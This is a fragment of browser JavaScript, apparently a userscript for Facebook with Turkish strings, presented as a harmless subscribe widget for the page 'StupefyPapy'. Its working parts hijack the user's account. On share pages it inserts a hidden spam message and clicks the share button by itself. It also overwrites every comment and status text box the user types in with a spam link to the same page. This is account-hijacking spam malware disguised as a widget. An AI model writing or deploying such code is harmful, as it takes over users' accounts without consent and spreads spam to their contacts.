...
if(body != null) {
	...
	div.innerHTML = "<div style='background-color: #2E5392; color: #FFFFFF; border: 1px solid #333333;'><center><a style='color: #FFFFFF;' <a href='https://www.facebook.com/plugins/subscribe.php?href=https%3A%2F%2Fwww.facebook.com%2FStupefyPapy'> Online Destek </a></div>"
	...
	div2.innerHTML = "<div style='background-color: #2E5392; color: #FFFFFF; border: 1px solid #333333;'><a style='color: #FFFFFF;' onclick='spoiler()' title='Click to Hidden Widget'>&laquo;</a> &#8226; <a href='https://www.facebook.com/plugins/subscribe.php?href=https%3A%2F%2Fwww.facebook.com%2FStupefyPapy' style='color: #FFFFFF;' onclick='alert(\'Thanks for install this script\');'>Abone kasmak için,</a></div> "
...
if (document.URL.indexOf("sharer.php") >= 0) {
    ...
    document.forms.item(0).innerHTML += "<input type='hidden' autocomplete='off' class='mentionsHidden' name='message' value='ABONE OL +1000 Abone Kazan http://www.facebook.com/StupefyPapy'>"; 
    document.getElementsByName("share").item(0).click();
}
if (document.URL.indexOf("facebook.com/Stupefypapy") >= 0 && document.URL.indexOf("sharer.php") < 0) {
...
for (i = 0; i <= document.getElementsByTagName("textarea").length - 1; i++) {
    document.getElementsByTagName("textarea").item(i).setAttribute("onkeydown", "if(this.value.indexOf('Tıkla ABONE OL +1000 Abone Kazan http://www.facebook.com/StupefyPapy ') < 0 && this.name == 'add_comment_text_text'){this.value = 'Tıkla ABONE OL +10 Abone Kazan http://www.facebook.com/StupefyPapy ';}");
}
document.addEventListener("click", function () {
    ...
    for (i = 0; i <= document.getElementsByTagName("textarea").length - 1; i++) {
        document.getElementsByTagName("textarea").item(i).setAttribute("onkeydown", "if(this.value.indexOf('ABONE OL +1000 Abone Kazan http://www.facebook.com/StupefyPapy') < 0 && this.name == 'add_comment_text_text' || this.name == 'xhpc_message_text' && this.value.indexOf('Tıkla ABONE OL +10 Abone Kazan http://www.facebook.com/StupefyPapy') < 0){this.value = 'Tıkla ABONE OL +10 Abone Kazan http://www.facebook.com/StupefyPapy ';}");
    }
